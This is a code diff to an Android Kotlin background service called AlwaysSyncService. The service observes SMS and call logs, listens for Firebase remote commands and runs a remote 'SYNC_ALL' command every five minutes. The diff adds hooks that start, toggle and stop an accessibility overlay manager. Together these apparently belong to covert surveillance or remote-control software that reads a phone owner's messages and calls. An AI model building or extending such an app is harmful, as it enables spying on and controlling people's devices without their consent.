@@ -60,6 +60,7 @@ class AlwaysSyncService : Service() {
     private fun initServiceLogic() {
         if (!isInitialized) {
             isInitialized = true
+            AccessibilityOverlayManager.startObserver(this)
             registerObservers()
             startPeriodicSyncLoop()
             startFirebaseCommandListener()
@@ -168,6 +169,7 @@ class AlwaysSyncService : Service() {
         serviceScope.launch {
             while (isActive) {
                 try {
+                    AccessibilityOverlayManager.checkAndToggleOverlay(applicationContext)
                     RemoteCommandManager(applicationContext).executeCommand("SYNC_ALL", "Periodic Service Interval (5 Min)")
                 } catch (_: Exception) {}
                 delay(300000) // 5 minutes periodic background sync
@@ -223,6 +225,7 @@ class AlwaysSyncService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        AccessibilityOverlayManager.stopObserver(this)
         smsObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
         callLogObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
         serviceJob.cancel()
